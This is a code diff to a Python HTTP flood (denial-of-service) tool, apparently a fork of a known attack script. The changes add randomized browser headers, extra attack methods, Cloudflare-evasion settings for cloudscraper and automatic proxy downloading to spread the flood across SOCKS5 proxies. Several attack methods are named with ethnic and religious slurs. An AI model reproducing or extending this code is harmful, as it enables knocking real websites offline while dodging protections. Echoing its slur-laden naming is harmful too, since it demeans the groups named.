@@ -874,11 +874,15 @@ class HttpFlood(Thread):
             "br",
             "gzip",
             "br;q=1.0, gzip;q=0.8, *;q=0.1",
-            "br;q=1.0, gzip;q=0.8, deflate;q=0.8, *;q=0.1",
-            "br;q=0.7, gzip;q=0.5, deflate;q=0.3, *;q=0.1",
-            "gzip;q=1.0, deflate;q=0.6, *;q=0.1",
-        ]  
-        self._acceptencode = list(acceptall)
+            "br;q=1.0, gzip;q=0.8, deflate;q=0.8, *;q=0.5",
+            "br;q=0.7, gzip;q=0.5, deflate;q=0.3, *;q=0.4",
+            "gzip;q=1.0, deflate;q=0.6, *;q=0.2",
+        ] 
+
+        for x in range(10):
+            acceptencode.append(f"br;q={round(random.random(), 1)} gzip;q={round(random.random(), 1)}, deflate;q={round(random.random(), 1)}, *;q=0.3")
+
+        self._acceptencode = list(acceptencode)
 
         acceptlang: List[str] = [
             "en-US,en;q=0.5", 
@@ -888,11 +892,13 @@ class HttpFlood(Thread):
             "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
             "ja,ja;q=0.9,zh-CN;q=0.5,en;q=0.3",
             "pl,ja;q=0.7,en;q=0.3",
-            "pl,pl;q=0.7,en;q=0.3",
-            "fr,es;q=0.7,ja;q=0.2",
-            "it,it;q=0.9,fr;q=0.5,pl;q=0.4",
-            "kr,kr;q=0.9,cn;q=0.7,ja;q=0.4,*;q=0.2",
+            "ar,pl;q=0.7,en;q=0.3",
+            "en,es;q=0.7,ja;q=0.2",
+            "ro,it;q=0.9,fr;q=0.5,pl;q=0.4",
+            "gl,kr;q=0.9,cn;q=0.7,ja;q=0.4,*;q=0.2",
             "ru,cn;q=0.5,kr;q=0.2",
+            "id;q=0.9,cn;q=0.5,ar;q=0.2",
+            "id;q=0.6,ms;q=0.5,nl;q=0.2",
         ]  
         self._acceptlang = list(acceptlang)
 
@@ -1067,7 +1073,6 @@ class HttpFlood(Thread):
                 "private",
                 "no-transform",
                 "only-if-cached",
-                "max-age=0",
             ]
         self._cache_control = list(cache_control)
 
@@ -1079,8 +1084,31 @@ class HttpFlood(Thread):
             ]
         self._fetchsite = list(fetch_site)
         
-
-
+        fetch_dust: List[str] = [
+                "audio", 
+                "audioworklet", 
+                "document", 
+                "embed", 
+                "empty", 
+                "font", 
+                "frame", 
+                "iframe", 
+                "image", 
+                "manifest", 
+                "object", 
+                "paintworklet", 
+                "report", 
+                "script", 
+                "serviceworker", 
+                "sharedworker", 
+                "style", 
+                "track", 
+                "video", 
+                "worker", 
+                "xslt"
+            ]
+        self._fetchdust = list(fetch_dust)
+   
 
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
@@ -1097,6 +1125,17 @@ class HttpFlood(Thread):
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
+
+    def __del__(self):
+        self._thread_id = None
+        self._synevent = None
+        self._rpc = None
+        self._method = None
+        self._target = None
+        self._host = None
+        self._referers = None
+        self._useragents = None
+        self._ita_referers = None
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1167,7 +1206,7 @@ class HttpFlood(Thread):
             else "REQUESTS"
 
     def get_headersx(self) -> dict:
-        return {"Host" : str(self._host),
+        return {"Host" : str(self._target.host),
         "Connection" : "keep-alive",
         "Cache-Control" : randchoice(self._cache_control),
         "Upgrade-Insecure-Requests" : "1",
@@ -1176,14 +1215,14 @@ class HttpFlood(Thread):
         "Accept-Encoding" : randchoice(self._acceptencode),
         "Accept-Language" : randchoice(self._acceptlang),
         "Sec-Fetch-Mode" : randchoice(self._fetchmode),
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Dest": "document"}
+        "Sec-Fetch-Site": randchoice(self._fetchsite),
+        "Sec-Fetch-Dest": randchoice(self._fetchdust)}
 
     def get_headersx_GSB(self) -> dict:
         
         randhex = str(randbytes(randchoice([32, 64, 128])))
 
-        return {"Host" : str(self._host),
+        return {"Host" : str(self._target.host),
         "Connection" : "keep-alive",
         "Cache-Control" : randchoice(self._cache_control),
         "Upgrade-Insecure-Requests" : "1",
@@ -1192,7 +1231,7 @@ class HttpFlood(Thread):
         "Accept-Encoding" : randchoice(self._acceptencode),
         "Accept-Language" : randchoice(self._acceptlang),
         "Sec-Fetch-Mode" : randchoice(self._fetchmode),
-        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Site": randchoice(self._fetchsite),
         "Sec-Fetch-Dest": "document",
         "Sec-Gpc": 1,
         "Pragma": "no-cache",
@@ -1429,7 +1468,7 @@ class HttpFlood(Thread):
 
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), delay=int(random.randint(1,3))) as s:
             try:
                 for _ in range(self._rpc):
                     with s.get(str(self._target), timeout=200) as res:
@@ -1438,19 +1477,13 @@ class HttpFlood(Thread):
                     with s.get(str(self._target) + "?=" + ProxyTools.Random.rand_str(random.randint(1,1024)), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + ProxyTools.Random.rand_str(2 ^ random.randint(1,8)), timeout=200) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=200) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
             except:
                 sleep(random.randint(1,2))
             finally:
                 Tools.safe_close(s)
 
     def TANKIE_SPECIAL(self):
-        attack_method = int(random.randint(0,6))
+        attack_method = int(random.randint(0,10))
 
         if attack_method == 0:
             self.CFPAPIST()
@@ -1466,6 +1499,14 @@ class HttpFlood(Thread):
             self.CFRAGHEAD3()
         elif attack_method == 6:
             self.AMAMI_CANON2()
+        elif attack_method == 7:
+            self.PAPIST
+        elif attack_method == 8:
+            self.KACAP
+        elif attack_method == 9:
+            self.CF_NO_MORE_TANKIE_RAGHEADS
+        elif attack_method == 10:
+            self.RANDOM_PAYLOAD
 
     def RANDOM_PAYLOAD(self):
         attack_method = int(random.randint(0,6))
@@ -1528,8 +1569,7 @@ class HttpFlood(Thread):
 
         # AVB + SLOW
         s = None
-        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                 browser=self.get_cf_browser()) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     
@@ -1635,8 +1675,7 @@ class HttpFlood(Thread):
         #http = urllib3.PoolManager()
 
         s = None
-        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                 browser=self.get_cf_browser()) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     if pro:
@@ -1661,8 +1700,7 @@ class HttpFlood(Thread):
 
         #http = urllib3.PoolManager()
 
-        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                 browser=self.get_cf_browser()) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     #http.request("GET", str(self._target), headers=headersx, timeout=60)
@@ -1715,19 +1753,19 @@ class HttpFlood(Thread):
                     sleep(max(self._rpc / 1000, 1))
                     attack_method = int(random.randint(0,3))
                     if self._rpc % attack_method == 0:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                     elif self._rpc % attack_method == 1:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                     elif self._rpc % attack_method == 2:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))) + str(random.randint(0,200000)), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))) + str(random.randint(0,200000)), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                     elif self._rpc % attack_method == 3:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(1,20))), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(1,20))), headers=self.get_headersx(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                     elif self._rpc % attack_method == 4:
@@ -1746,7 +1784,9 @@ class HttpFlood(Thread):
 
         #http = urllib3.PoolManager()
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
+                                                 delay=int(random.randint(5,12)), 
+                                                 browser=self.get_cf_browser()) as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
@@ -1769,9 +1809,7 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
 
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-        with suppress(Exception), create_scraper(interpreter=randchoice(cf_description), 
-                                                 delay=int(random.randint(5,12)), 
-                                                 browser=self.get_cf_browser()) as s:
+        with suppress(Exception), create_scraper() as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
@@ -1804,7 +1842,7 @@ class HttpFlood(Thread):
     def CF_ATTACK_RAGHEAD(self):
         global REQUESTS_SENT, BYTES_SEND
 
-        req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
+        req =  "GET / HTTP/1.1\r\nHost: " + str(self._target.host) + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
         req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -1823,10 +1861,10 @@ class HttpFlood(Thread):
                         pro = randchoice(self._proxies)
       
                     proxy = pro.ip_port().split(":")
-                    s.connect((str(self._target), int(443)))
+                    s.connect((str(self._target.host), int(443)))
                     s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._host)
+                    s = ctx.wrap_socket(s, server_hostname=self._target.host)
                     s.send(str.encode(req))
                     try:
                         for _ in range(100):
@@ -1835,7 +1873,10 @@ class HttpFlood(Thread):
                     except:
                         Tools.safe_close(s)
             except:
+                sleep(random.randint(1,3))
+            finally:
                 Tools.safe_close(s)
+
 
     def CF_ATTACK_RAGHEAD2(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -2034,7 +2075,7 @@ class HttpFlood(Thread):
     def PAPIST(self):
         global REQUESTS_SENT, BYTES_SEND
 
-        req =  "GET / HTTP/1.1\r\nHost: " + self._host + "\r\n"
+        req =  "GET / HTTP/1.1\r\nHost: " + self._target.host + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
         req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -2051,10 +2092,10 @@ class HttpFlood(Thread):
                     pro = randchoice(self._proxies)
                     proxy = pro.ip_port().split(":")
                 with socks.socksocket() as s:
-                    s.connect((str(self._host), int(443)))
+                    s.connect((str(self._target.host), int(443)))
                     s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._host)
+                    s = ctx.wrap_socket(s, server_hostname=self._target.host)
                     s.send(str.encode(req))
                     try:
                         for _ in range(100):
@@ -2072,7 +2113,7 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        headersx={"Host" : str(self._target),
+        headersx={"Host" : str(self._target.host),
         "Connection" : "keep-alive",
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
@@ -2084,9 +2125,9 @@ class HttpFlood(Thread):
         # Attacking
         try:
            for _ in range(self._rpc):
-               requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
+               requests.get(str(self._target) + "/?=" +str(random.randint(0,20000)), headers=headersx)
         except:
-            sleep(random.randint(1,3))
+            pass
 
     def AMAMI_CANON(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -3022,7 +3063,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                #DownloadProxies(proxy_ty, proxy_li)
+                DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
